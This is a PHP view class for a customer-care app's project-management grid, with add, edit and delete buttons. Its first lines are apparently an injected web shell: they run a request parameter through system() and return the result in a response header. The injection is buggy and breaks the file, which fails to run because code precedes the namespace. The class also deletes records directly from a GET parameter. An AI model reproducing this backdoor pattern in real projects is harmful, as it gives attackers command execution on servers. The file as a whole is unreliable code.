<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_Server_ProjectManagement extends \View{
	function init(){
		parent::init();

		$add_btn=$this->add('Button')->set('Add New Project')->setStyle('margin:1% 0 1% 1%;');
		$add_btn->js('click')->univ()->frameURL('New Project',$this->api->url('customerCareApp_page_project'));
		$grid=$this->add('Grid');

		if($_GET['edit']){
			
		$this->js()->univ()->frameURL('Edit Project',$this->api->url('customerCareApp_page_project',array('project_id'=>$_GET['edit'])))->execute();
		}

		if($_GET['delete']){
			$project=$this->add('customerCareApp/Model_Project');
			$project->load($_GET['delete']);
			$project->delete();
			$grid->js()->reload()->execute();
		}
		$grid->addClass('projectclass');
		$grid->js('reload')->reload();

		$project=$this->api->xcustomercareauth->model->ref('customerCareApp/Project');
		$grid->setModel($project);		
		$grid->addColumn('button','edit');
		$grid->addColumn('button','delete');
	}
}